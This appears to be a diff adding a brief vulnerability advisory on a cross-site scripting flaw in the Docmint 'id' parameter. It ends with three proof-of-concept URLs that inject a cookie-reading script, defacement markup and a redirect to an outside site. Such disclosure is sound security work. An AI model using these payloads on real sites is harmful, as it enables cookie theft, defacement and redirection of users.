@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/37721/info
+
+Docmint is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Docmint 1.0 is vulnerable; versions 2.1 and higher are also vulnerable; other versions may be affected as well. 
+
+http://www.example.com/index.php?id='"><script>alert(document.cookie)</script>
+http://www.example.com/index.php?id=<marquee><font color=Red size=16>Th3 RDX/font></marquee>
+http://www.example.com/index.php?id=<HTML><HEAD><TITLE>Redirect...</TITLE><META HTTP-EQUIV="REFRESH" CONTENT="0; URL=http://www.inj3ct0r.com"></HEAD><BODY>Redirect in corso...</BODY></HTML> 
